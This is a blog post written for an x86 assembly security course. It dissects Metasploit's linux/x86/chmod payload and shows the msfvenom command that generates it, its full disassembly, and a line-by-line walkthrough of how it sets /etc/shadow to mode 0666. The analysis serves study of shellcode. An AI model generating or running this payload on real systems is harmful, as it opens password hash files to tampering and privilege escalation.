---
layout: post
title:  "SLAE x86 Exam - Assignment 5 - Part 2"
categories: certs slae 
---


## Assignment #5 - Analyzing shellcode
_Student ID: **PA-7854**_

In this second part, we will analize the next Metasploit's payload: *linux/x86/chmod*.

The code is available at [my github repo](https://github.com/0xKiewicz/SLAE).

We will generate payloads with `msfvenom` as follows:

#### linux/x86/chmod

```bash
# msfvenom -p linux/x86/chmod -f raw --platform linux -a x86 -o /tmp/chmod-shadow.txt
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes
Saved as: /tmp/chmod-shadow.txt
```

Running it with no other parameters, FILE defaults to `/etc/shadow` and MODE defaults to `0666`. 

We dissect the generated file with `ndisasm`:
```nasm
# ndisasm -u /tmp/chmod-shadow.txt 
00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80C000000        call 0x16
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
```

Let's start analyzing again, line by line.
```nasm
00000000  99                cdq
```
_Convert Double Quad_. This is like a `xor edx, edx`, it copies the sign bit (+ or -, bit 31) of the value in EAX into every bit of the EDX register.


```nasm
00000001  6A0F              push byte +0xf
```
We push the value 0xf (15 in decimal) which corresponds to the chmod syscall.

```nasm
00000003  58                pop eax
```
Here we pop out that value and assign it to EAX.

`chmod` function signature is:
```c
int chmod(const char *pathname, mode_t mode);
```
Which we wil push ['/etc/shadow'],[0666], let’s see how this is being implemented.

```nasm
00000004  52                push edx
```
Save the value of EDX (which are NULL bytes), string delimiter, in stack.

```nasm
00000005  E80C000000        call 0x16
```
Again, this is supposed to call a function located at address 0x16 (`pop ebx` in this case). 
This is a technique so that the next instruction’s address is saved in stack. Next 7 lines are ambiguous. Call address location, which is 0x05, +0x4 (holds 4 bytes) + 0x1 should be the address holding the next instruction, which starts right below at 0xa. We can confirm this with xxd:

```bash
# echo 2f6574632f736861646f7700 | xxd -r -p
/etc/shadow
```

That's the FILE previously entered in `msfvenom`. Let’s keep analyzing, by skipping the first 22 characters, until the NULL byte after `/etc/shadow` string, so that `ndisasm` shows the instructions correctly:
```nasm
# ndisasm -u -e 22 /tmp/chmod-shadow.txt 
00000000  5B                pop ebx
00000001  68B6010000        push dword 0x1b6
00000006  59                pop ecx
00000007  CD80              int 0x80
00000009  6A01              push byte +0x1
0000000B  58                pop eax
0000000C  CD80              int 0x80
```

```nasm
00000000  5B                pop ebx
```
EBX holds the pointer to ESP, which is currently `/etc/shadow`.

```nasm
00000001  68B6010000        push dword 0x1b6
```
Push the value `0x1b6` which in octal notation is `666`, the MODE previously entered in `msfvenom`.

```nasm
00000006  59                pop ecx
```
ECX holds the pointer to ESP, which is currently `666`.

```nasm
00000007  CD80              int 0x80
```
This instruction should be familiar, makes an interrupt and executes the syscall (`chmod`).

```nasm
00000009  6A01              push byte +0x1
0000000B  58                pop eax
0000000C  CD80              int 0x80
```
These last lines of code are just a syscall to exit gracefully. `exit` syscall value is `1`.

Basically the syscall contains: _chmod('/etc/shadow', 0666)_
